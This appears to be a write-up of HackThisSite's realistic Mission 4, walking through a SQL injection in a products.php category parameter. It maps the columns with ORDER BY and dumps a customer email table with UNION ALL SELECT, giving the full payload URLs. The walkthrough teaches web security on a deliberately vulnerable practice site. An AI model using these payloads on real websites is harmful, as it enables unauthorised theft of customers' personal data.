# Mission 4
https://www.hackthissite.org/playlevel/4/

From: SaveTheWhales

Message: Hello, I was referred to you by a friend who says you know how to hack into computers and web sites - well I was wondering if you could help me out here. There's this local store who is killing hundreds of animals a day exclusively for the purpose of selling jackets and purses etc out of their skin! I have been to their website and they have an email list for their customers. I was wondering if you could somehow hack in and send me every email address on that list? I want to send them a message letting them know of the murder they are wearing. Just reply to this message with a list of the email addresses. Please?

**Answer:** The website we're targeting has a list of customer email addresses and we're tasked with getting them. A list of email addresses almost certainly means we're dealing with a database, and we've seen databases are susceptible to SQL injection attacks. So, without even seeing the site in detail yet, it sounds like that's our attack vector.

Click into the mission and it looks like a mom-and-pop business website. There are two pages with product contents, generated using some sort of PHP script (as evidenced by the products.php literal which appears in the URL structure when you open those pages). On the main page, there's a form to fill out to sign up for the mailing list. Enter a string which looks like a valid email address, click add to list, and you get a message saying 'Email added successfully'.

I thought maybe the solution was similar to the one in Mission 2, so I tried some of the common SQL injections I found [here](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens). None seemed to work, but I did get this error message: 'Error inserting into table "email"! Email not valid! Please contact an administrator of Fischer's'.

The error message never changed, so it got me thinking the solution wasn't as simple as putting the payload into the form box. But this message does reveal an important detail: the table containing the email addresses we want is named email. If only there was somewhere I could run a SQL query like `SELECT * FROM email;` or `SELECT email FROM email;`, that would give me what I'm looking for. Hmm.

Since the mailing list form seemed to be a dead end, I went back to the two product listing pages, https://www.hackthissite.org/missions/realistic/4/products.php?category=1 and https://www.hackthissite.org/missions/realistic/4/products.php?category=2. That's when I realized these pages must be associated with another database. The category=1 and category=2 parts of the URLs are parameters for querying this second database. What happens if we give this database an invalid input, like an invalid category value? In a secure world, I should get a 404 HTTP response.

I tried accessing https://www.hackthissite.org/missions/realistic/4/products.php?category=3 and a white page loaded. I didn't explicitly get a 404 response, so to confirm I opened developer tools, pulled open the network tab so I could view the flow of HTTP requests, and reloaded the page. Sure enough, I could see the document returned a 200 response code. In other words, we just gave the site an input it absolutely should have rejected as invalid, but it didn't.

We seem to have a way in via this URL loophole which allows us to tamper with the SQL queries being executed on the backend. I wildly tried a URL like https://www.hackthissite.org/missions/realistic/4/products.php?category=SELECT%20email%20FROM%20email (%20 is the URI encoding for spaces, so really the query was `SELECT email FROM email;`) and got a broken image in my response. This seems promising because we got another unexpected output, but it's clearly not what we're hoping for -- we want email addresses!

At this point I stepped back and thought through what we've discovered, as well as what I knew about SQL:
* The data we want is stored in a table called email.
* The table likely has only one column, and it's probably called email as well (this I guessed because the form from https://www.hackthissite.org/missions/realistic/4/ has the name email).
* The https://www.hackthissite.org/missions/realistic/4/products.php?category= URL structure is meant to query a different table, perhaps called products.
* Most SQL implementations give users the ability to select columns from multiple tables using the [UNION or UNION ALL](https://www.w3schools.com/sql/sql_ref_union.asp) commands (this I knew through prior experience with SQL). But a URL like https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20email%20FROM%20email doesn't seem to work either.

I read some hints online that using the ORDER BY command would be helpful in learning about the products table schema. So I tried the following:
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1 loads the page as intended.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%201%20DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%201%20DASC flips the sorting of the page contents according to the pictures. This suggests the image data type is the first column in the products table.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%202%20DESC AND https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%202%20DASC didn't change the page contents. But there's a common string, 'A big hairy fur coat that is made of fuzzy cute animals that we mercilessly slaughtered' in each product description, so this means the product description is probably the second column. It's a string data type.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%203%20DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%203%20ASC sorts by price. This means price is the third column, probably as a string, too.
* https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%20420DESC and https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%20420ASC didn't change any sorting again. But in many SQL tables there's an ID column, so maybe this is it.
* URLs containing https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20ORDER%20BY%205 returned the broken image icon. I think that means there's no fifth column. The products table only has four columns, which makes sense.

This explains a lot. UNION ALL requires there to be the same number of columns in the tables you're selecting from. As far as we know the email table only has one column, but we can fake more using NULL in our SELECT statement, like this: `SELECT email, NULL, NULL, NULL FROM email`.

I tried https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20email,%20null,%20null,%20null%20FROM%20email. The page loads with the usual page contents, but if you scroll down there are nine additional broken images. This seems close, but the issue now is the data types aren't right. If the first column of the products table is an image, SQL is expecting the first column of email to also be an image. The email column is a string, so we need that column to line up with another string column in the product table -- the second column of the product table will do the trick. We need to change our SQL query to `SELECT NULL, email, NULL, NULL FROM email`. OR `SELECT NULL, NULL, email, NULL FROM email`.

Try https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20null,%20email,%20null,%20null%20FROM%20email or https://www.hackthissite.org/missions/realistic/4/products.php?category=1%20UNION%20ALL%20SELECT%20null,%20null,%20email,%20null%20FROM%20email, and there are your email addresses. Copy them and message them to SaveTheWhales.

**Key Ideas:** For me this mission expanded on SQL injection knowledge. A form bypass isn't the only way to trigger a SQL injection table dump; you can also trigger one with a well-crafted URL payload. The misdirection was also fun to work through. After throwing a bunch of classic SQL injection payloads at the mailing list form and not getting a different error message, I figured I should try my luck elsewhere. Realizing I could enter invalid inputs into the https://www.hackthissite.org/missions/realistic/4/products.php?category= made me realize I was onto something, even though I needed a few hints to properly sketch out what the solution entailed.